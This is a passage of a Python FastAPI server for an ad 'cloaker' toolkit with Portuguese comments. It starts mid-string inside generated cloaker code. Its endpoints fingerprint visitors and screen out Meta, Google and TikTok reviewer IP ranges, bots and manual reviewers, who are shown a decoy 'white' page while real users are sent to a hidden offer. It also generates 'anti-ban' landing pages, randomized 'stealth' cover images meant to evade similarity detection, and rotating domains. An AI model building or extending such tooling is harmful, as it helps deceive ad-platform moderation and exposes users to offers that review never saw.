var fpData = getCanvasFingerprint() + '|' + getWebGLRenderer() + '|' + getAudioLatency() + '|' + navigator.language + '|' + screen.width + 'x' + screen.height;
var fpHash = btoa(fpData).slice(0, 32);
document.cookie = 'fp_hash=' + fpHash + '; path=/; max-age=86400';
document.cookie = 'js_enabled=1; path=/; max-age=86400';
</script>"""
    return {
        "status": "success",
        "safe_url": safe_url,
        "offer_url": offer_url,
        "code": php_code,
        "features": [
            "Validação de IP por ranges ASN do Meta/Facebook/Google/TikTok",
            "Checagem de cookie _fbp/_fbc para detectar revisor manual",
            "Browser Fingerprinting (Canvas, WebGL, AudioContext, Screen Resolution)",
            "Checagem de JavaScript executado (bot não roda JS)",
            "Delay aleatório 50-300ms no redirect (anti-pattern detection)",
            "Log de acesso completo com métricas de fingerprint",
            "Anti-cache headers para evitar cache do redirect",
            "Lista expandida de bots (30+ assinaturas incluindo Selenium/Puppeteer)"
        ]
    }

# === ENDPOINT 7: DASHBOARD DE ANALYTICS DO CLOAKER (Em Tempo Real) ===
@app.get("/api/cloaker/stats")
async def get_cloaker_stats():
    log_path = os.path.join(data_directory(CADS_DATA_DIR or BASE_DIR), "cloaker_log.txt")
    stats = {"total_access": 0, "bots_blocked": 0, "humans_passed": 0, "manual_reviewers": 0, "suspicious": 0, "hourly": {}}
    if os.path.exists(log_path):
        with open(log_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                stats["total_access"] += 1
                if "| Bot: YES" in line: stats["bots_blocked"] += 1
                else: stats["humans_passed"] += 1
                if "| ManualReview: YES" in line: stats["manual_reviewers"] += 1
                if "| Suspicious: YES" in line: stats["suspicious"] += 1
                try:
                    hour = line.split(" ")[1].split(":")[0]
                    stats["hourly"][hour] = stats["hourly"].get(hour, 0) + 1
                except: pass
    return stats

# === ENDPOINT 3: GERADOR DE LANDING PAGE WHITE COM IA (Anti-Ban) ===
@app.post("/api/landing-page/generate")
async def generate_white_landing_page(niche: str = Form(...), headline: str = Form("")):
    html_content = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{headline or 'Blog de ' + niche} - Informações e Dicas</title>
<style>
body {{ font-family: 'Helvetica Neue', Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background: #f9f9f9; }}
.container {{ background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }}
h1 {{ color: #2c3e50; border-bottom: 2px solid #eee; padding-bottom: 10px; }}
.disclaimer {{ background: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 20px 0; font-size: 0.9em; }}
.content {{ margin-top: 20px; text-align: justify; }}
</style>
</head>
<body>
<div class="container">
<h1>{headline or 'Entendendo o ' + niche + ': Um Guia Completo'}</h1>
<div class="disclaimer"><strong>Aviso Legal:</strong> Este conteúdo é estritamente educativo e informativo. Não substitui aconselhamento médico, financeiro ou profissional.</div>
<div class="content">
<p>O interesse por <strong>{niche}</strong> tem crescido exponencialmente. Neste artigo, exploramos fundamentos e práticas recomendadas baseadas em evidências.</p>
<h2>O Que Dizem os Especialistas?</h2>
<p>Profissionais enfatizam a importância da consistência e da abordagem personalizada. Não existe solução única para todos.</p>
<h2>Dicas Práticas</h2>
<ul><li>Mantenha uma rotina equilibrada.</li><li>Busque fontes verificadas.</li><li>Evite promessas rápidas demais.</li></ul>
</div>
</div>
</body>
</html>"""
    filename = f"white_page_{niche.replace(' ', '_')}_{int(time.time())}.html"
    filepath = os.path.join(processed_directory(), filename)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html_content)
    return {"status": "success", "filename": filename, "download_url": f"/api/download/{filename}", "message": "Pagina HTML gerada por modelo. Revise antes de publicar."}

# === ENDPOINT 11: WEBHOOK DE NOTIFICAÇÃO (Telegram/Discord) ===
@app.post("/api/webhook/notify")
async def send_webhook_notification(platform: str = Form(...), token: str = Form(...), message: str = Form(...), chat_id: str = Form("")):
    try:
        if platform == "telegram":
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            data = urllib.parse.urlencode({"chat_id": chat_id, "text": message}).encode()
            req = urllib.request.Request(url, data=data)
            urllib.request.urlopen(req)
            return {"status": "success", "message": "Notificação enviada para Telegram"}
        elif platform == "discord":
            data = json.dumps({"content": message}).encode()
            req = urllib.request.Request(token, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
            return {"status": "success", "message": "Notificação enviada para Discord"}
        else:
            return {"status": "error", "message": "Plataforma não suportada"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# === ENDPOINT 12: EXPORTAR DADOS PRA GOOGLE SHEETS (CSV) ===
@app.get("/api/export/google-sheets")
async def export_to_google_sheets():
    log_path = os.path.join(data_directory(CADS_DATA_DIR or BASE_DIR), "cloaker_log.txt")
    csv_content = "Timestamp,IP,UserAgent,IsBot,ManualReview,JS,Fingerprint,Suspicious,Referrer\n"
    if os.path.exists(log_path):
        with open(log_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                parts = line.strip().split(" | ")
                if len(parts) >= 8:
                    clean_parts = [p.split(": ", 1)[1] if ": " in p else p for p in parts]
                    csv_content += ",".join([f'"{p}"' for p in clean_parts]) + "\n"
    filename = f"cads_export_{int(time.time())}.csv"
    filepath = os.path.join(processed_directory(), filename)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(csv_content)
    return {"status": "success", "filename": filename, "download_url": f"/api/download/{filename}", "message": "Dados exportados para CSV (importe no Google Sheets)"}

# === ENDPOINT 9: MODO STEALTH (Variações Infinitas de Capa) ===
@app.post("/api/stealth/generate-cover")
async def generate_stealth_cover(niche: str = Form(...)):
    palettes, copy_bank = _niche_copy_bank(niche.lower(), niche)
    palette = random.choice(palettes)
    img = Image.new('RGB', (1080, 1920), color=palette[0])
    draw = ImageDraw.Draw(img)
    for _ in range(5000):
        x, y = random.randint(0, 1079), random.randint(0, 1919)
        noise_color = (random.randint(0, 50), random.randint(0, 50), random.randint(0, 50))
        draw.point((x, y), fill=noise_color)
    try:
        font_large = ImageFont.truetype("arial.ttf", 80)
        font_small = ImageFont.truetype("arial.ttf", 40)
    except:
        font_large = ImageFont.load_default()
        font_small = ImageFont.load_default()
    h1 = random.choice(copy_bank["h1"])
    h2 = random.choice(copy_bank["h2"])
    draw.text((100, 800), h1, fill=palette[2], font=font_large)
    draw.text((100, 900), h2, fill=palette[3], font=font_small)
    filename = f"stealth_cover_{int(time.time())}_{random.randint(1000,9999)}.jpg"
    filepath = os.path.join(processed_directory(), filename)
    img.save(filepath, quality=random.randint(80, 95))
    return {"status": "success", "filename": filename, "download_url": f"/api/download/{filename}", "message": "Variacao de capa gerada. Sem garantia contra reconhecimento por similaridade."}

# === ENDPOINT 2: ROTADOR DE DOMÍNIO AUTOMÁTICO ===
@app.post("/api/domain/rotate")
async def rotate_domain(new_domain: str = Form(...)):
    conn = sqlite3.connect(database_path())
    c = conn.cursor()
    c.execute("UPDATE domain_rotator SET status = 'inactive' WHERE status = 'active'")
    c.execute("INSERT INTO domain_rotator (domain, status, last_checked) VALUES (?, 'active', ?)", (new_domain, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return {"status": "success", "active_domain": new_domain, "message": "Domínio rotacionado com sucesso"}

@app.get("/api/domain/status")
async def get_domain_status():
    conn = sqlite3.connect(database_path())
    c = conn.cursor()
    c.execute("SELECT domain, status FROM domain_rotator ORDER BY id DESC LIMIT 5")
    rows = c.fetchall()
    conn.close()
    return {"domains": [{"domain": r[0], "status": r[1]} for r in rows]}

# === ENDPOINT 10: AUTENTICAÇÃO POR API KEY ===
@app.get("/api/auth/verify")
async def verify_api_key(x_api_key: str = Header(None)):
    result = check_api_key(x_api_key)
    return result

@app.post("/api/auth/create-key")
async def create_api_key(plan: str = Form("free")):
    if plan not in {"free", "pro", "enterprise"}:
        raise HTTPException(400, "Escolha um plano free, pro ou enterprise.")
    import secrets
    new_key = f"CADS-{secrets.token_hex(16).upper()}"
    conn = sqlite3.connect(database_path())
    c = conn.cursor()
    c.execute("INSERT INTO api_keys (key, plan, created_at) VALUES (?, ?, ?)", (new_key, plan, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return {"status": "success", "api_key": new_key, "plan": plan}

@app.get("/")
def serve_index():
    return FileResponse(
        os.path.join(PUBLIC_DIR, "index.html"),
        headers={"Cache-Control": "no-store, max-age=0"},
    )


@app.get("/favicon.ico", include_in_schema=False)
def favicon():
    return Response(status_code=204)


@app.get("/api/download/{filename:path}")
def download_file(filename: str):
    safe_name = os.path.basename(filename)
    path = os.path.join(processed_directory(), safe_name)
    if not os.path.exists(path):
        raise HTTPException(status_code=404, detail="Arquivo não encontrado")
    return FileResponse(path, filename=safe_name, content_disposition_type="attachment")

# === ENDPOINT: DELETAR ARQUIVO GERADO ===
@app.post("/api/file/delete")
async def delete_file(filename: str = Form(...)):
    safe_name = os.path.basename(filename)
    path = os.path.join(processed_directory(), safe_name)
    if not os.path.exists(path):
        return {"status": "error", "message": "Arquivo não encontrado"}
    try:
        os.remove(path)
        stats_state()["recent_activities"] = [a for a in stats_state()["recent_activities"]
                                      if a.get("filename") != safe_name]
        return {"status": "success", "message": f"Arquivo {safe_name} excluído com sucesso"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# === ENDPOINT: LIMPAR TODO O HISTÓRICO DE ATIVIDADE ===
@app.post("/api/activity/clear-all")
async def clear_all_activity():
    """Oculta o histórico atual sem excluir os arquivos gerados."""
    items = list_processed_activities(limit=None)
    with closing(sqlite3.connect(database_path())) as conn, conn:
        conn.executemany('INSERT OR IGNORE INTO hidden_activities (filename) VALUES (?)',
                         [(a["filename"],) for a in items])
    stats_state()["recent_activities"].clear()
    return {
        "status": "success",
        "hidden": len(items),
        "deleted": 0,
        "message": "Histórico limpo. Os arquivos foram preservados."
    }

# === ENDPOINT 13: SEO AUTOPILOT (Estilo Soro/trysoro.com) ===
@app.post("/api/seo/generate-article")
async def generate_seo_article(
    niche: str = Form(...),
    keyword: str = Form(""),
    target_audience: str = Form("geral"),
    tone: str = Form("educativo")
):
    """
    Gera artigo SEO otimizado com IA (templates inteligentes + variação de conteúdo)
    - Pesquisa palavras-chave relacionadas
    - Escreve artigo com estrutura SEO (H1, H2, meta description, schema)
    - Conteúdo educativo neutro pra atrair tráfego orgânico do Google e ChatGPT
    """
    # Gerar variações de palavras-chave relacionadas
    kw_base = keyword if keyword else niche
    related_keywords = [
        f"como escolher {kw_base}",
        f"melhor {kw_base} 2026",
        f"{kw_base} vale a pena",
        f"guia completo {kw_base}",
        f"{kw_base} para iniciantes",
        f"dicas de {kw_base}",
        f"{kw_base} recomendado",
        f"onde comprar {kw_base}",
    ]

    # Templates de artigo por tom
    templates = {
        "educativo": {
            "intro": f"O interesse por <strong>{niche}</strong> tem crescido exponencialmente nos últimos anos. Muitas pessoas buscam informações confiáveis para tomar decisões melhores.",
            "h2_1": "O Que Você Precisa Saber Antes de Começar",
            "content_1": f"Antes de investir em {kw_base}, é fundamental entender os fundamentos. Profissionais da área enfatizam a importância da pesquisa e da comparação entre opções disponíveis no mercado.",
            "h2_2": "Critérios de Escolha Importantes",
            "content_2": f"Ao avaliar {kw_base}, considere fatores como qualidade, custo-benefício, reputação da marca e suporte pós-venda. Não existe solução única para todos — a melhor escolha depende das suas necessidades específicas.",
            "h2_3": "Dicas Práticas para o Dia a Dia",
            "content_3": f"<ul><li>Pesquise avaliações de outros consumidores</li><li>Compare preços em diferentes lojas</li><li>Verifique a política de garantia e devolução</li><li>Consulte especialistas quando tiver dúvidas</li></ul>",
            "conclusion": f"Esperamos que este guia tenha sido útil para sua jornada de aprendizado sobre {niche}. Lembre-se: informação é poder, mas a aplicação correta exige sabedoria e paciência.",
        },
        "comparativo": {
            "intro": f"Comparar opções de <strong>{niche}</strong> pode ser desafiador com tantas alternativas no mercado. Neste artigo, analisamos os principais critérios para ajudar você a decidir.",
            "h2_1": "Principais Opções Disponíveis",
            "content_1": f"O mercado de {kw_base} oferece desde opções básicas até soluções premium. Cada categoria atende um perfil diferente de consumidor, com vantagens e limitações próprias.",
            "h2_2": "Tabela Comparativa de Características",
            "content_2": f"<table style='width:100%; border-collapse: collapse; margin: 20px 0;'><tr style='background:#f5f5f5;'><th style='padding:10px; border:1px solid #ddd;'>Característica</th><th style='padding:10px; border:1px solid #ddd;'>Opção Básica</th><th style='padding:10px; border:1px solid #ddd;'>Opção Intermediária</th><th style='padding:10px; border:1px solid #ddd;'>Opção Premium</th></tr><tr><td style='padding:10px; border:1px solid #ddd;'>Preço</td><td style='padding:10px; border:1px solid #ddd;'>Baixo</td><td style='padding:10px; border:1px solid #ddd;'>Médio</td><td style='padding:10px; border:1px solid #ddd;'>Alto</td></tr><tr><td style='padding:10px; border:1px solid #ddd;'>Qualidade</td><td style='padding:10px; border:1px solid #ddd;'>Padrão</td><td style='padding:10px; border:1px solid #ddd;'>Boa</td><td style='padding:10px; border:1px solid #ddd;'>Excelente</td></tr><tr><td style='padding:10px; border:1px solid #ddd;'>Suporte</td><td style='padding:10px; border:1px solid #ddd;'>Limitado</td><td style='padding:10px; border:1px solid #ddd;'>Regular</td><td style='padding:10px; border:1px solid #ddd;'>VIP</td></tr></table>",
            "h2_3": "Qual Escolher?",
            "content_3": f"A decisão final depende do seu orçamento e das suas expectativas. Para quem está começando, a opção básica pode ser suficiente. Para uso intensivo ou profissional, considere as opções intermediária ou premium.",
            "conclusion": f"Não existe resposta certa ou errada — existe a resposta certa para VOCÊ. Avalie suas necessidades, compare as opções e tome uma decisão informada sobre {niche}.",
        },
        "guia": {
            "intro": f"Este guia completo sobre <strong>{niche}</strong> foi criado para ajudar você a entender tudo o que precisa saber, desde os conceitos básicos até dicas avançadas.",
            "h2_1": "Capítulo 1: Introdução ao Tema",
            "content_1": f"{niche} é um assunto que envolve diversos aspectos. Neste primeiro capítulo, vamos explorar os fundamentos e explicar por que esse tema tem ganhado tanta atenção recentemente.",
            "h2_2": "Capítulo 2: Passo a Passo Prático",
            "content_2": f"<ol><li><strong>Pesquise:</strong> Antes de qualquer ação, gather informações de fontes confiáveis</li><li><strong>Planeje:</strong> Defina seus objetivos e orçamento</li><li><strong>Execute:</strong> Comece com pequenos passos e ajuste conforme necessário</li><li><strong>Avalie:</strong> Meça os resultados e refine sua abordagem</li></ol>",
            "h2_3": "Capítulo 3: Erros Comuns a Evitar",
            "content_3": f"<ul><li>Não compre por impulso sem pesquisar</li><li>Não ignore avaliações de outros consumidores</li><li>Não esqueça de verificar a política de garantia</li><li>Não tenha pressa — decisões importantes merecem tempo</li></ul>",
            "conclusion": f"Parabéns por chegar até aqui! Agora você tem uma base sólida sobre {niche}. Continue aprendendo, teste na prática e ajuste sua estratégia conforme necessário.",
        }
    }

    # Selecionar template baseado no tom
    tmpl = templates.get(tone, templates["educativo"])

    # Gerar título SEO otimizado
    title_options = [
        f"{niche}: Guia Completo 2026 | Tudo o Que Você Precisa Saber",
        f"Como Escolher {niche} em 2026: Dicas de Especialistas",
        f"{niche} Vale a Pena? Análise Completa e Recomendações",
        f"Melhor {niche} de 2026: Comparativo e Guia de Compra",
    ]
    title = random.choice(title_options)

    # Gerar slug URL-friendly
    slug = re.sub(r'[^a-z0-9]+', '-', title.lower().strip())[:80]

    # Meta description SEO
    meta_description = f"Descubra tudo sobre {niche} neste guia completo. Dicas práticas, comparativos e recomendações de especialistas para ajudar você a tomar a melhor decisão em 2026."

    # Schema markup JSON-LD (Article)
    schema_markup = {
        "@context": "https://schema.org",
        "@type": "Article",
        "headline": title,
        "description": meta_description,
        "author": {
            "@type": "Organization",
            "name": "CADS Pro SEO Autopilot"
        },
        "datePublished": datetime.now().strftime("%Y-%m-%d"),
        "keywords": ", ".join(related_keywords[:5])
    }

    # Montar HTML completo do artigo
    html_content = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <meta name="description" content="{meta_description}">
    <meta name="keywords" content="{', '.join(related_keywords)}">
    <meta name="robots" content="index, follow">
    <link rel="canonical" href="https://seusite.com.br/{slug}">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="article">
    <meta property="og:title" content="{title}">
    <meta property="og:description" content="{meta_description}">

    <!-- Schema Markup JSON-LD -->
    <script type="application/ld+json">
    {json.dumps(schema_markup, indent=2, ensure_ascii=False)}
    </script>

    <style>
        body {{ font-family: 'Helvetica Neue', Arial, sans-serif; line-height: 1.7; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background: #f9f9f9; }}
        .container {{ background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }}
        h1 {{ color: #2c3e50; border-bottom: 3px solid #D4AF37; padding-bottom: 15px; font-size: 2em; }}
        h2 {{ color: #34495e; margin-top: 30px; border-left: 4px solid #D4AF37; padding-left: 15px; }}
        .meta {{ color: #737373; font-size: 0.9em; margin-bottom: 20px; }}
        .disclaimer {{ background: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 20px 0; font-size: 0.9em; }}
        .content {{ margin-top: 20px; text-align: justify; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ padding: 10px; border: 1px solid #ddd; text-align: left; }}
        th {{ background: #f5f5f5; }}
        ul, ol {{ margin: 15px 0; padding-left: 25px; }}
        li {{ margin-bottom: 8px; }}
        .cta-box {{ background: linear-gradient(135deg, #D4AF37 0%, #E5C158 100%); color: #000; padding: 20px; border-radius: 8px; text-align: center; margin: 30px 0; }}
        .cta-box a {{ display: inline-block; background: #000; color: #D4AF37; padding: 12px 30px; text-decoration: none; border-radius: 6px; font-weight: 700; margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{title}</h1>
        <div class="meta">
            <span>📅 Publicado em {datetime.now().strftime('%d/%m/%Y')}</span> |
            <span>⏱️ Leitura: 5 min</span> |
            <span>🏷️ {niche}</span>
        </div>

        <div class="disclaimer">
            <strong>Aviso Legal:</strong> Este conte��do é estritamente educativo e informativo. Não substitui aconselhamento profissional. Consulte sempre um especialista antes de tomar decisões importantes.
        </div>

        <div class="content">
            <p>{tmpl['intro']}</p>

            <h2>{tmpl['h2_1']}</h2>
            <p>{tmpl['content_1']}</p>

            <h2>{tmpl['h2_2']}</h2>
            {tmpl['content_2']}

            <h2>{tmpl['h2_3']}</h2>
            {tmpl['content_3']}

            <div class="cta-box">
                <strong>Pronto para dar o próximo passo?</strong><br>
                Fale com nossa equipe especializada e tire todas as suas dúvidas.
                <br>
                <a href="https://wa.me/SEUNUMERO">💬 Conversar no WhatsApp</a>
            </div>

            <h2>Conclusão</h2>
            <p>{tmpl['conclusion']}</p>

            <hr style="margin: 30px 0; border: none; border-top: 1px solid #eee;">

            <h3>Palavras-chave relacionadas:</h3>
            <p style="color: #737373; font-size: 0.9em;">{', '.join(related_keywords)}</p>
        </div>
    </div>

    <!-- CADS Pro SEO Autopilot Tracking -->
    <script>
        console.log("CADS Pro SEO Article Loaded | Niche: {niche} | Keyword: {kw_base}");
    </script>
</body>
</html>"""

    # Salvar arquivo
    filename = f"seo_article_{slug}_{int(time.time())}.html"
    filepath = os.path.join(processed_directory(), filename)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html_content)

    return {
        "status": "success",
        "filename": filename,
        "download_url": f"/api/download/{filename}",
        "title": title,
        "slug": slug,
        "meta_description": meta_description,
        "related_keywords": related_keywords,
        "schema_markup": schema_markup,
        "message": f"Artigo SEO gerado com sucesso! Otimizado para Google e ChatGPT. Palavras-chave: {', '.join(related_keywords[:3])}..."
    }

from server.product_video import router as product_video_router

app.include_router(product_video_router)
app.include_router(accounts.router)
app.mount("/", StaticFiles(directory=PUBLIC_DIR, html=True), name="public")
app = SecurityHeadersMiddleware(app)
